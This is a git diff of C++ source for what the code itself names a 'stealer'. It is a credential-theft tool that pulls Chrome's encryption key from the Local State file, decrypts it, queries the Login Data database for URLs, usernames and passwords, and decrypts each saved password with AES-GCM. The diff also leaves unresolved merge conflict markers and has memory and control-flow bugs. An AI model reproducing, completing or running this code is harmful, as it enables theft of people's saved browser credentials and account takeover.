@@ -64,12 +64,22 @@ void print_hex(BYTE *data, size_t dataLen)
 
 std::string decrypt_password(std::string encrypted_pass, BYTE *key)
 {
+    
+    //std::cout<<"decrypt"+encrypted_pass+"\n"<<std::endl;
     /*BYTE key_256[256];
     for (int i = 0; i < 256; i++)
     {
         key_256[i] = key[i];
     }*/
+<<<<<<< HEAD
+
+    if(encrypted_pass.length()<31){
+        return "too short";
+    }
+    auto cipher = new AESGCM(key);
+=======
     auto cipher = new AESGCM_STEALER(key);
+>>>>>>> c24bc565337790c79505fd6309419d19be133cc2
     std::string iv_string = encrypted_pass.substr(3,12);
     std::vector<uint8_t> iv_vec(iv_string.begin(), iv_string.end());
     BYTE *iv = &iv_vec[0];
@@ -78,11 +88,15 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
     std::vector<uint8_t> ciphertext_vec(cipher_string.begin(), cipher_string.end() - 16);
     BYTE *ciphertext = &ciphertext_vec[0];
     
-    std::vector<uint8_t> tag_vec(cipher_string.end() - 16, cipher_string.end());
+    std::vector<uint8_t> tag_vec(encrypted_pass.end() - 16, encrypted_pass.end());
     BYTE *tag = &tag_vec[0];
 
     // printf("Attempting decryption...\n");
-    cipher->Decrypt(iv, (size_t)iv_vec.size(), ciphertext, (size_t)ciphertext_vec.size(), tag, (size_t)tag_vec.size());
+    if(cipher->Decrypt(iv, (size_t)iv_vec.size(), ciphertext, (size_t)ciphertext_vec.size(), tag, (size_t)tag_vec.size())==0){
+        printf("can't decrypt");
+        return"error";
+    }
+
 
     // char* pt = new char[cipher->ptBufferSize+1];
     /*for (int i = 0; i < cipher->ptBufferSize; i++)
@@ -92,16 +106,25 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
     }
     printf("\n");
     */
+    try{
+        //cipher->Decrypt(iv, (size_t)iv_vec.size(), ciphertext, (size_t)ciphertext_vec.size(), tag, (size_t)tag_vec.size());
+        char* p = new char[cipher->ptBufferSize];
+        memcpy(p,cipher->plaintext,cipher->ptBufferSize);
+        p[cipher->ptBufferSize] = 0;
+        std::string str(p);
 
-    char* p = new char[cipher->ptBufferSize];
-    memcpy(p,cipher->plaintext,cipher->ptBufferSize);
-    p[cipher->ptBufferSize] = 0;
-    std::string str(p);
-
-    //std::cout<<p<<std::endl;
+        //std::cout<<p<<std::endl;
+        return p;
+    }catch(const char* &e)
+    {
+        std::cout<<e<<std::endl;
+        return"error";
+    }
+    
     delete cipher;
+    
 
-    return p;
+    return "fail";
 }
 
 LPCWSTR stringToLPCWSTR(std::string orig)
@@ -129,21 +152,26 @@ LPCWSTR stringToLPCWSTR(std::string orig)
     return wcstring;
 }
 
+
+
+
+
 std::string stealer()
 {
 
-    std::string return_string = ""; 
+    std::string return_string = "Login data"; 
+    //std::cout<<return_string<<std::endl;
     std::string localstate = get_chrome_localstate();
 
     std::string base64_key = get_encryptedkey(localstate);
-    std::cout << base64_key << std::endl;
+    //std::cout << base64_key << std::endl;
 
     std::vector<uint8_t> key = b64Decode(base64_key);
     std::string str_key(key.begin(), key.end());
 
     str_key = str_key.substr(5);
-    std::cout << str_key << std::endl;
-    std::cout << str_key.length() << std::endl;
+    //std::cout << str_key << std::endl;
+    //std::cout << str_key.length() << std::endl;
 
 
     int i;
@@ -165,8 +193,8 @@ std::string stealer()
             result[i] = DataVerify.pbData[i];
         }
     }
-    std::cout << result << std::endl;
-    std::cout << len << std::endl;
+    //std::cout << result << std::endl;
+    //std::cout << len << std::endl;
 
     char *user_path = getenv("USERPROFILE");
     std::string chrome_db_path;
@@ -188,6 +216,18 @@ std::string stealer()
     }
 
 
+
+    std::string s1 ; 
+    std::string s2 ;
+    std::string s3 ;
+    std::string s4 ;
+    std::string s5 ;
+    std::string string_url ;
+    std::string string_user;
+    std::string string_pass;
+
+    std::string string_password;
+
     // https://blog.csdn.net/weixin_30696427/article/details/97547260?spm=1001.2101.3001.6650.11&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-11.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-11.pc_relevant_paycolumn_v3&utm_relevant_index=16
     sqlite3_stmt *stmt; 
     const char *sqlSentence = "SELECT origin_url, username_value, password_value FROM logins";
@@ -201,38 +241,42 @@ std::string stealer()
             //printf("--------------------------------\n");
 
             //printf("Origin URL: %s\n", origin_url);
-            std::string s1 = "Origin URL: "; 
-            std::string s2 = "Username: ";
-            std::string s3 = "Password: ";
-            std::string s4 =  "\n";
-            std::string s5 = "--------------------------------\n";
-            std::string string_url = reinterpret_cast<const char*>(origin_url);
-            std::string string_user = reinterpret_cast<const char*>(username_value);
+            s1 = "Origin URL: "; 
+            s2 = "Username: ";
+             s3 = "Password: ";
+             s4 =  "\n";
+             s5 = "--------------------------------\n";
+            string_url = reinterpret_cast<const char*>(origin_url);
+             string_user = reinterpret_cast<const char*>(username_value);
             
             
             //printf("Username: %s\n", username_value);
 
             const char *char_pass = reinterpret_cast<const char *>(password_value);
-            std::string string_pass = char_pass;
-            std::string str_pass(char_pass);
-            std::string string_password;
-            try
-            {
-                string_password = decrypt_password(str_pass, result);
-                
-            }
-            catch (const std::exception &e)
-            {
-                std::cout << e.what() << std::endl;
-            }
-
-            return_string.append(s5);
-            return_string.append(s1+string_url+s4);
-            return_string.append(s2+string_user+s4);
-            return_string.append(s3+string_password+s4);
             
+    
+            string_pass=std::string(char_pass);
+            //std::cout<<"fk password: "+string_pass+"\n"<<std::endl;
+            try{
+                string_password = decrypt_password(string_pass, result);
+                return_string.append(s5);
+                return_string.append(s1+string_url+s4);
+                return_string.append(s2+string_user+s4);
+                return_string.append(s3+string_password+s4);
+            }
+            catch(const char* &e)
+            {
+                std::cout<<e<<std::endl;
+                continue;
+            }
+            std::cout<<string_password<<std::endl;
+            if (string_password!="error"){
+                
+                //std::cout<<return_string<<std::endl;
+            }
             
         }
+        //std::cout<<return_string<<std::endl;
     }
     else{
             printf("SQL statement preparation failed... %s\n", sqlite3_errmsg(chrome_db));
@@ -241,13 +285,15 @@ std::string stealer()
             return "SQL statement preparation failed...";
         
         }
+    
+    std::cout<<return_string<<std::endl;
 
     sqlite3_finalize(stmt);
     sqlite3_close(chrome_db);
     
-        
+    //std::cout<<return_string<<std::endl;
 
-        return return_string;
+    return return_string;
 
         
 }
